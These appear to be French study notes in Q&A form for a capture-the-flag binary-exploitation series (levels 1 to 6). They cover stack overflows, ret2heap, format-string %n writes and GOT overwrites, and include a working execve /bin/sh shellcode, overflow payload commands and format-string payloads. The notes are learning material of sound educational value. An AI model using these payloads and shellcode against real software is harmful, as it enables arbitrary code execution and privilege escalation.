# Questions de Sécurité - Buffer Overflow & Exploitation

## Level 1 : Buffer Overflow Basique

### 1. Buffer Overflow

#### Qu'est-ce qu'un buffer overflow ? Explique avec tes mots ce qui se passe en mémoire.

Un buffer overflow est ce qui se passe lorsqu'on affecte plus de valeurs à un buffer que ce qu'il a été initialisé pour au départ. Par exemple, dans level1, le buffer est attribué 76 bits dans la mémoire, mais un buffer overflow serait de lui donner 80 ou 100 bits à stocker, ce qui ferait dépasser la place dédiée pour le buffer dans la mémoire.

#### Pourquoi envoyer 100 'A' cause un segfault ?

Parce qu'on fait un buffer overflow, et on va chercher des informations là où il n'est pas censé y en avoir.

#### Quelle est la différence entre écraser EIP et écraser d'autres variables sur la stack ?

EIP est la variable dans la stack qui garde en mémoire l'adresse de retour du programme. Si on l'écrase et qu'on lui donne une nouvelle adresse par exemple, alors à la fin du programme, c'est à cette nouvelle adresse que le programme va retourner.

---

### 2. La fonction run()

Tu as trouvé une fonction `run()` à l'adresse `0x08048444`.

#### Pourquoi cette fonction existe-t-elle si elle n'est jamais appelée dans le code normal ?

C'est la fonction "faille" du programme que l'on doit exploiter. Il va falloir écraser la valeur dans EIP par l'adresse de cette fonction pour pouvoir lancer `/bin/sh`.

#### Comment sais-tu que cette fonction est intéressante pour l'exploitation ?

Quand on lit la fonction, on voit qu'elle permet de lancer `/bin/sh`, ce qui va nous permettre ensuite de cat le password en tant que lvl2, car on a vu avant que l'exécutable s'exécute en tant que user level2.

#### Que se passerait-il si tu appelais directement run() depuis ton shell (sans exploit) ?

Je ne sais pas comment faire ça, mais j'imagine qu'on aurait un `/bin/sh` qui se lance, mais sans les droits utilisateurs de level2.

---

### 3. L'offset

Tu notes : "Si EIP = 0x42424242 (BBBB) → offset = 76"

#### Qu'est-ce que EIP ? À quoi sert ce registre ?

Comme dit avant, EIP est la variable dans la stack qui garde en mémoire l'adresse de retour du programme. Si on l'écrase et qu'on lui donne une nouvelle adresse par exemple, alors à la fin du programme, c'est à cette nouvelle adresse que le programme va retourner.

#### Pourquoi chercher à contrôler EIP spécifiquement ?

Même réponse que pour la question juste avant.

#### Comment as-tu déterminé que l'offset est exactement 76 ? (méthodologie)

Dans Ghidra, en décompilant le code on voit : `char buffer[76]`

Mais sinon, on peut tester empiriquement en balançant dans le programme avec GDB :

```bash
python -c "print('A' * 76 + 'BBBB')"
```

Et on regarde ensuite la valeur de EIP en ayant mis un break juste avant le return.

---

### 4. Little-endian

Tu convertis `0x08048444` en `\x44\x84\x04\x08`.

#### Qu'est-ce que le little-endian ? Pourquoi l'ordre des octets est-il inversé ?

C'est la façon dont communique notre ordinateur pour les adresses. Je ne sais pas trop plus par rapport à ça, éclaire moi.

#### Si l'adresse était 0xdeadbeef, quelle serait la représentation little-endian ?

`\xef\xbe\xad\xde`

#### Pourquoi l'architecture x86 utilise-t-elle le little-endian ?

Je ne sais pas. Explique moi.

---

### 5. Le payload

Ta commande :

```bash
bash(printf 'AAA...AAA\x44\x84\x04\x08'; cat) | ./level1
```

#### Pourquoi utiliser (printf ...; cat) au lieu de juste printf ?

Afin d'avoir un bash qui tourne en continu. D'ailleurs je voudrais changer ce printf en utilisant `python -c "print"`. Quelle serait la bonne commande ?

#### Que fait exactement la commande cat ici ?

Elle permet de faire tourner `/bin/sh` en continu.

#### Que se passerait-il sans le cat ?

Le programme s'arrêterait.

---

### 6. La stack

#### Dessine (ou décris) la stack avant et après le buffer overflow.

Je ne sais pas.

#### Où se trouve le buffer dans la stack par rapport à EIP ?

76 octets avant ?

#### Pourquoi 76 octets exactement ? Que représentent ces octets ?

Je ne sais pas.

---

## Level 2 : Contournement des Protections

### 1. Protection anti-stack

Tu mentionnes : "Le programme a une protection qui bloque les adresses commençant par 0xb"

#### Pourquoi les adresses de la stack commencent-elles par 0xb ?

Je ne sais pas.

**Réponse fournie :** C'est la plage d'adresses réservée par Linux pour la stack en architecture 32-bit.

#### Comment le programme détecte-t-il qu'une adresse commence par 0xb ?

Avec une comparaison.

#### Quelle partie du code implémente cette vérification ? (as-tu vu ça dans Ghidra ?)

Je l'ai vu dans Ghidra, c'est dans la fonction `p()`.

---

### 2. Le heap

Tu utilises `ltrace` pour trouver l'adresse heap : `0x0804a008`

#### Qu'est-ce que le heap ? En quoi est-il différent de la stack ?

| Caractéristique | Stack | Heap |
|---|---|---|
| **Croissance** | Vers le bas (adresses décroissantes) | Vers le haut (adresses croissantes) |
| **Allocation** | Automatique (variables locales) | Manuelle (`malloc`, `strdup`) |
| **Taille** | Fixe (définie au lancement) | Dynamique (s'agrandit si besoin) |
| **Vitesse** | Rapide (juste déplacer ESP) | Plus lent (gestion de la free list) |
| **Adresses** | `0xbfxxxxxx` (hautes) | `0x0804xxxx` (basses) |
| **Durée de vie** | Jusqu'à la fin de la fonction | Jusqu'au `free()` |

#### Pourquoi l'adresse heap commence-t-elle par 0x08 au lieu de 0xb ?

Je ne sais pas.

**Réponse fournie :** Organisation de l'espace d'adressage.

#### Pourquoi utiliser strdup() ? Que fait cette fonction exactement ?

La fonction `strdup()` renvoie un pointeur sur une nouvelle chaîne de caractères qui est dupliquée depuis la chaîne qui lui est donnée en argument. Je pense qu'elle ne fait pas de vérification de buffer, ce qui permet de l'exploiter.

**Réponse fournie :** Correct. voici plus de precisions:

Pourquoi exploitable ?
- strdup() copie TOUT ce qu'on lui donne (y compris notre shellcode)
- Pas de vérification de longueur
- Alloue sur le heap (adresse 0x08... → pas bloquée !)

#### Est-ce que l'adresse 0x0804a008 est toujours la même à chaque exécution ? Pourquoi ?

Pas tout le temps, mais souvent. Non ?

---

### 3. Le shellcode

Tu utilises un shellcode de 21 octets :

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

#### Qu'est-ce qu'un shellcode ? Explique avec tes mots.

Le shellcode est un langage qui permet d'injecter un script dans le programme.

**Correction** : Un shellcode est du **code machine** (assembleur compilé en bytes), pas un langage.

**Définition précise** :
```
Shellcode = Suite d'instructions assembleur en hexadécimal
            qu'on injecte dans un programme vulnérable
            pour exécuter du code arbitraire
```	
**Exemple** :
```asm
; Code assembleur (lisible par les humains)
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80

↓ Compilé en bytes (exécutable par le CPU)

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

```

#### Pourquoi 21 octets spécifiquement ? As-tu trouvé ce shellcode ou l'as-tu créé ?

J'ai trouvé ce shellcode, mais 21 parce qu'il ne faut pas qu'il ne dépasse l'offset non ?

**Correction** : La taille du shellcode n'est pas liée à l'offset directement.

**Contraintes** :
1. ✅ Doit être assez petit pour tenir dans le buffer (< 80 octets ici)
2. ✅ Pas de bytes NULL (\x00) → casserait la chaîne pour gets()
3. ✅ Plus court = mieux (plus de place pour le padding)

#### Que fait ce shellcode en assembleur ? (pas besoin de détailler chaque instruction, juste l'idée générale)

Il permet de lancer un `/bin/sh`.

**Reponse** : correct! **Appel système** execve("/bin/sh", NULL, NULL) 

**detail** : 
```asm
push 0x0b        ; syscall number (execve = 11)
pop eax
cdq              ; met edx à 0 (environ)
push edx         ; NULL terminator
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp     ; ebx pointe vers "/bin//sh"
xor ecx, ecx     ; argv = NULL
int 0x80         ; syscall
```

#### Pourquoi injecter du code au lieu de sauter vers une fonction existante (comme run() dans level1) ?

Parce qu'il n'y en a pas qui permettent d'exploiter une faille.

---

### 4. L'offset

Tu notes : "Si affiche (0xbfffffbf) → offset = 80"

#### Comment as-tu déterminé que l'offset est 80 ? (méthodologie)

Je ne sais plus, mais pense qu'il aurait été judicieux de refaire une méthode avec pattern non ?

**méthode avec pattern cyclique** :
```
$ gdb level2
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A...
^D

Program received signal SIGSEGV
(gdb) info registers eip
eip  0x41366441  # "dA6A" en ASCII
# Chercher "dA6A" dans le pattern → position 80
```

#### Pourquoi tester avec \xbf\xff\xff\xbf spécifiquement ?

Je ne sais plus.

**Réponse** :
- C'est une adresse de la stack (commence par 0xb)
- Si le programme affiche (0xbfffffbf) → la protection a détecté notre adresse
- Ça confirme que l'offset est bon ET que la protection fonctionne

#### Est-ce que l'offset est le même que dans level1 (76) ? Si différent, pourquoi ?

Je ne sais plus.

**Réponse**:
Level1 : offset = 76
Level2 : offset = 80
Explication : La différence vient de strdup() !

Layout de la stack - Level1
```
cvoid main(void) {
    char buffer[64];  // NON ! C'est local_50[76]
    gets(buffer);
}
```

**Stack** :
```
┌─────────────────┐ ← ESP
│  local_50[76]   │ 76 octets
├─────────────────┤
│  Saved EBP      │ 4 octets (souvent écrasé par le buffer)
├─────────────────┤
│  Saved EIP      │ 4 octets ← On veut écraser ici
└─────────────────┘

Offset = 76 (pas de padding entre buffer et saved EIP)
```

Layout de la stack - Level2
```
cvoid p(void) {
    char local_50[76];
    unsigned int ret_addr;  // ← Variable supplémentaire !
    
    gets(local_50);
}
```

**Stack** :
```
┌─────────────────┐ ← ESP
│  local_50[76]   │ 76 octets
├─────────────────┤
│  ret_addr       │ 4 octets ← Variable locale supplémentaire
├─────────────────┤
│  Saved EBP      │ 4 octets
├─────────────────┤
│  Saved EIP      │ 4 octets ← On veut écraser ici
└─────────────────┘

Offset = 76 + 4 = 80 octets
```
La différence : La variable ret_addr (qui stocke la saved return address lue depuis la stack) prend 4 octets supplémentaires !

---

### 5. Le padding

Structure du payload :

```
Shellcode (21 octets) + Padding (59 octets) + Adresse (4 octets)
```

#### Pourquoi 59 octets de padding exactement ? Comment as-tu calculé ce nombre ?

Parce que `80 (offset) - 21 (shellcode) = 59 (padding)`.

#### Vérification : 21 + 59 + 4 = 84. Mais tu dis offset = 80. Il y a une différence de 4 octets, pourquoi ?

Je ne sais plus.

#### Que se passerait-il si tu mettais 60 octets de padding au lieu de 59 ?

Je ne sais pas, ça ne marcherait pas ? Pourquoi ?

**Réponse** :
l'adresse commencerait a 81, pas 80, ce qui ne permttrait pas d'ecraser EIP correctement.

---

### 6. ltrace vs GDB

Tu utilises `ltrace` pour trouver l'adresse heap.

#### Quelle est la différence entre ltrace et strace ?

Je ne sais pas.
| Outil | trace | exemple |
|---|---|---|
| **ltrace** | Appels de bibliothèque (libc) | strdup(), printf(), malloc() |
| **strace** | Appels système (kernel) | open(), read(), write(), execve() |

#### Pourquoi ltrace plutôt que GDB pour trouver l'adresse heap ?

Plus simple ?


**Réponse** : strdup() affiche directement l'adresse de retour !

#### Si tu n'avais pas ltrace, comment trouverais-tu l'adresse heap autrement ?

GDB ? et je cherche EAX ? Pas sûr.

---

### 7. Le déroulement de l'exploitation

#### Décris étape par étape ce qui se passe quand tu envoies ton payload :

**a. Où va le shellcode en mémoire ?**

Je ne sais pas.
```
gets(local_50);  // Lit notre payload dans local_50 (sur la STACK)
strdup(local_50); // Copie local_50 sur le HEAP à 0x0804a008
```

**Mémoire** :
```
STACK (0xbfxxxxxx) :
  [Shellcode 21][Padding 59][0x0804a008]
                              ^^^^^^^^^^^
                              Adresse heap

HEAP (0x0804a008) :
  [Shellcode 21][Padding 59][0x0804a008]
   ^^^^^^^^^^^^^
   Notre code exécutable !
```

**b. Que fait strdup() avec ton input ?**

Il écrase EIP ?

**Correction** : `strdup()` ne fait **rien** à EIP directement.

**Séquence** :
1. `gets()` écrit notre payload sur la stack → **écrase saved EIP**
2. `strdup()` copie le payload sur le heap
3. La fonction `p()` fait `ret`
4. `ret` charge saved EIP → `0x0804a008` (notre adresse heap)
5. Le CPU saute à `0x0804a008`
6. Exécute notre shellcode ! ✅

**c. Comment EIP finit-il par pointer vers ton shellcode ?**

Buffer overflow.

**Réponse**: Buffer overflow écrase saved EIP avec `0x0804a008`.

#### Pourquoi cette technique s'appelle "ret2heap" ?

Je ne sais pas.
**ret2heap** = **Return-to-heap**

**Nomenclature des exploits** :
```
ret2func  : Retourner vers une fonction existante (level1)
ret2libc  : Retourner vers une fonction de la libc
ret2heap  : Retourner vers du code sur le heap (level2) ✅
ret2shellcode : Retourner vers du shellcode (générique)
ROP       : Return-Oriented Programming (chaîner des gadgets)
```

#### Quelle est la différence principale entre l'exploitation de level1 et level2 ?

Je ne sais pas.

## 🎯 Questions de compréhension - Level3 

### 1 : Format String Vulnerability
Tu identifies une format string vulnerability.

**Qu'est-ce qu'une format string vulnerability ? Explique avec tes mots.**

**reponse:**
    Une format string vulnerability apparaît quand un programme passe directement l'input utilisateur comme format string à printf().c
    ```
    // ✅ Code sécurisé :
    printf("%s", user_input);  // user_input est traité comme une STRING

    // ❌ Code vulnérable :
    printf(user_input);        // user_input est traité comme un FORMAT
    ```
    Pourquoi c'est dangereux ?Quand tu passes "%x %x %x" directement à printf() :

    printf() cherche des arguments sur la stack
    Ces arguments n'existent pas (tu n'en as pas donné)
    printf() lit quand même les valeurs suivantes sur la stack
    Tu peux lire et écrire en mémoire !

**Pourquoi tester avec %x %x %x ? Que fait %x exactement ?**

**reponse**
        %x = Affiche l'argument suivant en hexadécimal.
```c
printf("%x", 255);    // Affiche : ff
printf("%x", 65)      // Affiche : 41
printf("%x %x", 1, 2) // Affiche : 1 2
printf("%x %x %x");  // Pas d'arguments !
// printf() lit les 3 prochaines valeurs sur la stack
// et les affiche en hexa
```

**Quelle est la différence entre une format string et un buffer overflow ?**

**reponse**

|  | Buffer overflow | format string |
|---|---|---|
| **cause** | Trop de données écrites | Format specifiers dans l'input |
| **fonction vulnerable** | gets(), strcpy() | printf(), sprintf() |
| **Action** |Écrit au-delà du buffer | lit/écrit des adresses arbitraires |
| **Complexite** | Moyenne |Plus subtile|
| **danger** | Écraser EIP| Lire/écrire n'importe où en mémoire|

**Quelle fonction est vulnérable dans ce niveau ? (as-tu vu le code dans Ghidra ?)**

**reponse:**

la fonction v. oui on a le code dans ghidra.
```c
void v(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);  // ⚠️ Vulnérable !
}
```

### 2 : Les format specifiers
Tu utilises plusieurs format specifiers : %x, %n, %4$n

    1. Que fait %x ?
        Je ne sais pas explique moi
**Que fait %n ? Pourquoi est-ce dangereux ?**

**reponse**
- Écrit le nombre de caractères affichés jusqu'ici dans une variable
- L'adresse de cette variable doit être un argument

```c
int count;
printf("Hello%n", &count);
// count = 5 (nombre de chars affichés avant %n)
// Normal (avec argument) :
printf("%n", &ma_variable);    // Écrit dans ma_variable ✅

// Vulnérable (sans argument) :
printf("AAAA%n");              // Écrit à l'adresse présente sur la stack !
                                // On peut écrire N'IMPORTE OÙ en mémoire ⚠️
```

**Que signifie %4$n ? Pourquoi utiliser le $ ?**

**reponse**
- $ = Accès direct à un argument par sa position
```c
printf("%4$n", a, b, c, &target);
//      ^ ^ ^
//      | | └─ Utilise le 4ème argument directement
//      | └─── n = écrire
//      └───── 4 = position
```


**Quels autres format specifiers existent ? (liste 3-4 exemples)**

### 3 : La variable globale m
Tu cherches l'adresse de m : 0x0804988c

**Qu'est-ce qu'une variable globale ? Où se trouve-t-elle en mémoire ?**

**reponse**
Une variable globale est une variable qui est definie en dehors de toutes les fonctions, elle est utilisable par toutes les fonctions du programme.

**Où en mémoire ?**
```
Layout mémoire Linux 32-bit :

0x08048000  ┌─────────────────┐
            │ .text           │ ← Code du programme
            ├─────────────────┤
            │ .rodata         │ ← Chaînes constantes
0x0804a000  ├─────────────────┤
            │ .data           │ ← Variables globales INITIALISÉES
            │ .bss            │ ← Variables globales NON INITIALISÉES ← m est ici
0x0804b000  ├─────────────────┤
            │ Heap            │
            └─────────────────┘
```

**`m` est dans `.bss`** car c'est une variable globale non initialisée

**Pourquoi l'adresse 0x0804988c est-elle dans cette plage (0x0804...) ?**

**reponse:**
- C'est la plage des sections de données du programme
- Déterminée à la compilation/linkage
- Adresse **fixe** (pas d'ASLR ici)

**Comment as-tu trouvé cette adresse dans Ghidra ? (commande ou fenêtre ?)**

j'ai clique sur la varibale m dans le fonction v().

**La condition est if (m == 0x40). Pourquoi 64 en décimal = 0x40 en hexa ?**

parce que 64 = 0x40 en hexa



### 4 : Position sur la stack
Tu testes avec AAAA%x.%x.%x... et trouves 41414141 en 4ème position.

**Pourquoi mettre AAAA au début du payload ?**

**reponse**
1. AAAA = valeur reconnaissable en mémoire (0x41414141)
2. printf() avec %x lit la stack séquentiellement
3. On cherche où sur la stack se trouve notre input
4. Quand on voit 41414141 → on sait que notre input est à cette position
```bash
python -c "print('AAAA' + '%x.'*10)" | ./level3
# AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825...
#                            ^^^^^^^^
#                            Position 4 ! C'est notre "AAAA"

**Position 1** = `200`
**Position 2** = `b7fd1ac0`
**Position 3** = `b7ff37d0`
**Position 4** = `41414141` ← Notre input ! ✅
```


**Comment sais-tu que c'est la 4ème position ? (as-tu compté les %x ?)**

on voit 41414141 en 4emem position, cets le pattern de AAAA quon cherche

**Que représente 41414141 en ASCII ?**

AAAA

**Pourquoi est-ce important de connaître cette position ?**

**reponse**

**C'est crucial !** La position nous dit **quel argument `%n` va utiliser**.
```
    Si notre input est en position 4 :
    → %4$n écrira à l'adresse contenue en position 4
    → On met notre adresse cible en position 4 (au début du payload)
    → %4$n écrira à cette adresse !
```

### 5 : Le padding
Tu utilises %60x pour afficher 60 caractères.

**Pourquoi exactement 60 caractères ?**

parce que m doit etre a egal a 64

**Calcul : 4 (adresse) + 60 (padding) = 64. Comment ce 64 se retrouve dans m ?**

C'est le cœur du mécanisme `%n` !

```
printf compte les caractères affichés :

1. Affichage de l'adresse (4 octets) : "\x8c\x98\x04\x08"
   → 4 caractères affichés

2. Affichage de %60x (padding)
   → 60 caractères affichés

Total affiché = 4 + 60 = 64

%n écrit ce total (64) dans m !
```

**Visualisation** :
```c
printf("\x8c\x98\x04\x08" + "%60x" + "%4$n")
        │                    │        │
        │                    │        └─ Écrit 64 dans m (position 4)
        │                    └─ Affiche 60 chars
        └─ 4 chars affichés

Compteur interne de printf : 4 + 60 = 64
%n écrit 64 à l'adresse en position 4 (= adresse de m)
```

**Que se passerait-il si tu utilisais %59x au lieu de %60x ?**

4 + 59 = 63 → m = 63 ≠ 64 → Condition fausse → Pas de shell ❌

**Que fait %x sans nombre devant (ex: juste %x au lieu de %60x) ?**
```c
printf("%x")    // Affiche la valeur en hexa, largeur minimale : 0
                // Peut afficher 1, 2, 3, 4... caractères selon la valeur

printf("%60x")  // Affiche MINIMUM 60 caractères
                // Si la valeur fait moins de 60 chars → rembourrage avec des espaces
```


### 6 : Le format specifier %n
Tu utilises %4$n pour écrire dans m.

**%n écrit quoi exactement à l'adresse pointée ?**

%n écrit le nombre de caractères affichés jusqu'à lui dans la variable pointée.

**Pourquoi %4$n et pas juste %n ?**

parce que m est a la 4eme position

**Si tu utilisais %3$n, que se passerait-il ?**

Position 3 sur la stack = valeur random (pas notre adresse)
%3$n écrirait à une adresse random → Segfault probable ❌

**Comment %n "sait" à quelle adresse écrire ?**

**Mécanisme détaillé** :
```
Notre payload : \x8c\x98\x04\x08 + %60x + %4$n

Quand printf() lit le payload :
1. Il lit les 4 premiers octets → les affiche (c'est notre adresse)
2. Ces 4 octets sont aussi EN POSITION 4 sur la stack
   (car le buffer commence à la position 4 de printf)
3. %4$n → printf() lit la valeur à la position 4
   → C'est 0x0804988c (notre adresse)
4. %n → printf() écrit le compteur (64) à l'adresse 0x0804988c
5. m = 64 ✅
```




### 7 : Construction du payload
Payload : \x8c\x98\x04\x08 + %60x + %4$n

**Pourquoi mettre l'adresse au début du payload ?**

je ne sais pas

**L'adresse 0x0804988c devient \x8c\x98\x04\x08 → Explique la conversion.**

cets du little endian

**Dans ton payload, tu as %4\$n avec un backslash. Est-ce nécessaire ?**

oui pour que $ soit interprete dans le shell:
```bash
# Sans backslash :
python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4$n')"
# Le shell interprète $ comme une variable d'environnement !
# %4$n → %4 + (valeur de $n) → ERREUR

# Avec backslash :
python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"
# Le backslash échappe le $ → %4$n ✅
```

**Décris étape par étape ce qui se passe en mémoire quand ce payload est exécuté.**
```
1. fgets() lit notre payload dans local_20c (sur la stack)

2. printf(local_20c) :
   a. Lit "\x8c\x98\x04\x08" → Affiche 4 chars
      (Compteur interne : 4)
   
   b. Lit "%60x" → Affiche 60 chars
      (Compteur interne : 64)
   
   c. Lit "%4$n" :
      - Saute à la position 4 de la stack
      - Position 4 = \x8c\x98\x04\x08 = adresse de m
      - Écrit 64 (compteur) à l'adresse 0x0804988c
      - m = 64 ✅

3. if (m == 0x40) → if (64 == 64) → TRUE !

4. system("/bin/sh") → Shell obtenu !
```



### 8 : Comparaison avec les niveaux précédents

**Quelle est la principale différence entre level3 et level1/level2 ?**

Level1/2 : Buffer overflow → Contrôle EIP → Redirige l'exécution
Level3   : Format string   → Écrit dans m → Modifie une condition

**Dans level1/2, on écrasait EIP. Dans level3, qu'écrase-t-on ?**

**On n'écrase pas EIP !**

On écrit dans la **variable globale `m`** pour satisfaire une condition dans le code.

**Pourquoi n'a-t-on pas besoin de shellcode dans level3 ?**

Parce que system("/bin/sh") existe déjà dans le code !

**Est-ce qu'il y a un buffer overflow dans level3 ?**

non


### 9 : La condition m == 0x40

**Que se passe-t-il si m == 64 (la condition est vraie) ?**

ca lance un /bin/sh, on le voit dans ghidra

**Que se passe-t-il si m != 64 ?**

ca ne lance pas le /bin/sh

**Pourrais-tu écrire une autre valeur que 64 dans m avec cette technique ?**

oui, mais ca ne sert a rien

**Comment écrirais-tu par exemple 1000 dans m ?**

il faut mettre 996 de padding




### 10 : Sécurité et protections

**Comment un développeur devrait-il corriger cette vulnérabilité ?**

**Quelle fonction devrait-on utiliser à la place de la fonction vulnérable ?**

**La correction est simple :**
```c
// ❌ Vulnérable :
printf(local_20c);

// ✅ Sécurisé :
printf("%s", local_20c);
```


**Est-ce que cette vulnérabilité existe encore dans les programmes modernes ?**

Rare mais existe encore !


## 🎯 Questions de compréhension - Level4
### 1 : Similarités avec level3

**Quelle est la différence principale entre level3 et level4 ?**

la principale difference est dans le code. sur hgidra on voit que le printf se trouve dans une fonciton p.

**Pourquoi la position est-elle 12 ici au lieu de 4 dans level3 ?**

comme pour le level3 on teste avec AAAA et on retrouve le pattern a la 12eme position

**Le mécanisme %n est le même, qu'est-ce qui change exactement ?**

on met a la 12eme position cest tout.

### 2 : La valeur à écrire
Dans level3, on écrivait 64. Ici on écrit 16930116 (0x1025544).

**Pourquoi ne peut-on pas faire %16930112x avec %x comme dans level3 avec %60x ?**

(techniquement on peut, mais qu'est-ce qui change ?)

ce serait trop long?

**Ton walkthrough dit %16930112d. Quelle est la différence entre %d et %x pour le padding ?**

je ne sais pas

**Calcul : 16930116 - 4 = 16930112. Vérifie ce calcul avec la conversion hex :**

0x1025544 en décimal = ? (montre-moi le calcul)

je ne sais pas, mais on sen fout

### 3 : Le comportement du programme
Dans level3, le shell s'ouvrait interactivement.
Ici, tu notes : "Le programme affiche le flag directement"

**Quelle est la différence entre system("/bin/sh") et system("/bin/cat /home/user/level5/.\*\*pass") ?**

ca affiche le flag recherche, pas besoin de le cat nous meme

**Pourquoi n'a-t-on pas besoin du trick ; cat ici ?**

pas besoin de faire tourner un /bin/sh

**As-tu vu le code dans Ghidra ? Envoie-le moi si possible.**

ok

### 4 : L'adresse de m
Level3 : 0x0804988c
Level4 : 0x08049810

**Pourquoi ces adresses sont-elles différentes d'un niveau à l'autre ?**

ce nest aps le meme programme

**Les deux sont dans la plage 0x0804.... Pourquoi ?**

cest tous les 2 des variables globales, ce sont le plage d'adresse dans un programme


## 🎯 Questions de compréhension - Level5
**1 : La GOT (Global Offset Table)**
C'est le concept central de ce niveau.

**Qu'est-ce que la GOT ? Explique avec tes mots.**

Quand ton programme utilise exit(), printf(), system()... ces fonctions ne sont pas dans ton programme. Elles sont dans la libc (bibliothèque C).

Problème : À la compilation, on ne sait pas encore où sera chargée la libc en mémoire.

Solution : La GOT (Global Offset Table).

```
La GOT est un tableau d'adresses en mémoire.
Chaque entrée = adresse réelle d'une fonction externe.

GOT :
┌─────────────────────────────────┐
│ exit  → 0xb7e9f750 (dans libc)  │
│ printf → 0xb7e6f830 (dans libc) │
│ system → 0xb7e8b000 (dans libc) │
└─────────────────────────────────┘
```

Comment ca fonctionne:
```
Ton programme appelle exit(1) :
   ↓
1. Va chercher l'adresse dans la GOT
2. GOT[exit] = 0xb7e9f750
3. Saute à 0xb7e9f750 (libc)
4. exit() s'exécute
```

**Pourquoi exit() a-t-elle une entrée dans la GOT ?**

Parce que exit() est une fonction externe (dans la libc), pas dans ton programme.
Toute fonction externe a une entrée dans la GOT.

**Quelle est la différence entre la GOT et le code du programme (.text) ?**

|  | .text | GOT |
|---|---|---|
| **Contenu** | Code machine (instructions) | Adresses de fonctions|
| **modifiable?** |  Non (read-only) |  Oui (read-write) |
| **Plage** | 0x08048xxx | 0x08049xxx |

**Pourquoi peut-on écrire dans la GOT ?**

La GOT est en mémoire read-write (elle doit être modifiable car le linker la remplit au démarrage du programme).

**2 : La technique GOT overwrite**
Tu remplaces l'adresse de exit() par l'adresse de o().


**Qu'est-ce qui se passe normalement quand exit() est appelée ?**

```
exit(1) appelé → GOT[exit] = 0xb7e9f750 → exit() dans libc → Programme quitte
```

**Après l'overwrite, que se passe-t-il quand exit(1) est appelée dans le code ?**

```
exit(1) appelé → GOT[exit] = 0x080484a4 (o()) → o() s'exécute → /bin/sh !
```

**Pourquoi cibler exit() spécifiquement ici ?**

On cible exit() car c'est la première fonction appelée après printf() dans le code.

**Aurait-on pu cibler une autre fonction dans la GOT ?**

Oui ! On aurait pu cibler n'importe quelle fonction dans la GOT.


**3 : objdump**
Tu utilises objdump -R level5 | grep exit pour trouver l'adresse.


**Qu'est-ce que objdump ? En quoi est-il différent de ltrace et strace ?**

objdump = "Object dump"
→ Outil d'analyse de binaires ELF
→ Affiche les informations internes du binaire

**Que fait le flag -R dans objdump -R ?**

-R = Affiche les relocations dynamiques (= entrées de la GOT)

**Pourquoi l'adresse de exit() dans la GOT est-elle dans la plage 0x0804... ?**

La GOT est une section de données du programme, donc dans la plage 0x0804....


**4 : La fonction o()**
Tu veux rediriger exit() vers o().


**Pourquoi o() n'est-elle jamais appelée normalement ?**


**Que fait _exit(1) à la fin de o() ? Est-ce différent de exit(1) ?**

```c
exit(1);   // Termine le programme EN APPELANT les fonctions de nettoyage
           // (flush des buffers, atexit handlers, etc.)
           // Passe par la libc

_exit(1);  // Termine le programme DIRECTEMENT via syscall
           // Pas de nettoyage
           // Plus rapide, bypass la libc
```
**Pourquoi a-t-on besoin du trick ; cat ici ?**

pour faire tourner /bin.sh en continu



**5 : Le calcul du payload**
Tu calcules : 0x080484a4 = 134513824 en décimal.


**Vérifie ce calcul (montre les étapes).**

**Pourquoi soustrait-on 4 pour obtenir le padding (134513824 - 4 = 134513820) ?**

la taille de l'adresse

**Dans ton walkthrough tu notes %134513824d%4$n mais le calcul donne 134513820. Lequel est correct ?**



**6 : Comparaison avec level3/4**


**Dans level3/4 on écrivait dans une variable globale. Ici on écrit dans la GOT. Quelle est la différence fondamentale ?**

```
Level3/4 : On écrit dans une VARIABLE GLOBALE
           → Modifie une donnée
           → Déclenche une condition if()

Level5   : On écrit dans la GOT
           → Modifie l'ADRESSE D'UNE FONCTION
           → Détourne un appel de fonction
```

**Dans level3/4, la condition if (m == ...) déclenchait le shell. Ici, quel mécanisme déclenche o() ?**

l'appel de exit qui execute ce qui trouve a l'adresse, qu'on a remplace par l'adresse de o()

**Pourquoi cette technique est-elle plus puissante que celle de level3/4 ?**

```
Level3/4 : Le développeur doit avoir mis une condition exploitable dans son code
           → Limité à ce que le code prévoit

Level5   : On peut remplacer N'IMPORTE QUELLE fonction par N'IMPORTE QUELLE autre
           → Pas besoin de condition dans le code
           → On prend le contrôle de manière générique
```

## 🎯 Questions de compréhension - Level6
**1 : Heap overflow**

Dans les niveaux précédents on faisait des buffer overflows sur la stack. Ici c'est sur le heap.


**Quelle est la différence entre un buffer overflow sur la stack et sur le heap ?**

c'est le meme concept, zone mémoire différente.

**Quelle fonction cause le buffer overflow ici ? Pourquoi est-elle dangereuse ?**

strcpy. elle ne verifie pas la taille des argmuments et ne protege aps des buffer oiverflow

**Pourquoi le programme crash sans arguments ?**

 passe un argument NULL a strcpy qui ne verifie pas ses arguments

**2 : Les allocations malloc**

Le code fait deux malloc() consécutifs :
c__dest = malloc(0x40);   // 64 bytes
puVar1 = malloc(4);      // 4 bytes


**Que fait malloc() ? Où alloue-t-il la mémoire ?**

il alloue de la memoire, sur la heap

**Pourquoi ces deux allocations sont-elles adjacentes en mémoire ?**

fonctionne comme unliste, alloue a la suite

**Que contient puVar1 initialement (*puVar1 = m) ?**

un pointeur vers la fonction m()


**3 : Le function pointer**

Le code fait :
c*puVar1 = m;           // Stocke l'adresse de m()
(*(code *)*puVar1)();  // Appelle la fonction pointée


**Qu'est-ce qu'un pointeur de fonction ?**

une variable qui contient l'adresse d'une fonction

**Pourquoi appeler une fonction via un pointeur plutôt que directement ?**

Dans notre cas : Le développeur utilise un pointeur de fonction pour choisir quelle fonction appeler. C'est cette flexibilité qu'on exploite !

**Si on écrase puVar1 avec l'adresse de n(), que se passe-t-il ?**

appelle n() au lieu de m()


**4 : L'offset de 72**

Tu trouves que l'offset est 72 bytes.


